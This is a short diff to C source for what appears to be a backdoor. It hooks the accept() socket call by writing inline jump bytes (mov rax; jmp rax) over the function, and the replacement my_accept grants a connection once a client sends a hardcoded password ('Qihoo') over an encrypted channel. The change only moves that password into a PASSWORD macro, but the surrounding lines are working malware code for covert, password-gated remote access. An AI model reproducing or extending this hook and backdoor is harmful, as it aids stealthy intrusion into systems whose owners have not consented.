@@ -18,7 +18,7 @@
 #define BACKLOG 5
 #define MAX_PATH 260
 #define BUF_SIZE 32768
-
+#define PASSWORD "Qihoo"
 bool is_connect = false;
 char g_old_accept_buffer[13];
 char g_new_accept_buffer[] = "\x48\xb8\x48\x47\x46\x45\x44\x43\x43\x41\xff\xe0";
@@ -236,7 +236,7 @@ int my_accept(int sockfd, struct sockaddr* addr, socklen_t* addrlen) {
 			send(client_id, buf_send, sizeof(buf_send), 0);
 			while (1) {
 				if (recv_with_decrypt(buf_recv, sizeof(buf_recv))) {
-					if (!strcmp(buf_recv, "Qihoo")) {
+					if (!strcmp(buf_recv, PASSWORD)) {
 						strcpy(buf_send, "pass");
 						send_with_encrypt(buf_send, sizeof(buf_send));
 						break;
